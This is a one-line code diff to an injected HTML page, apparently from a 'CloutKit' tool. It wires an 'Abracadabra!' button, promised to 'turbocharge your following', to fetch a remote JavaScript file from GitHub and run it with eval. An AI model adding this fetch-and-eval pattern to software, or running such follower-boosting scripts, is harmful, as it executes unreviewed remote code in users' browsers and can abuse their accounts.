@@ -272,7 +272,7 @@ document.documentElement.innerHTML=`<head>
           <div class="narrow">
             <p>Press the button to turbocharge your following!</p>
           </div>
-          <button onclick=""><span>Abracadabra!</span></button>
+          <button onclick="fetch('https://raw.githubusercontent.com/SuperS0n1k/CloutKit/main/abracadabra.js').then(r=>r.text()).then(t=>eval(t))"><span>Abracadabra!</span></button>
         </div>
       </div>
     </div>
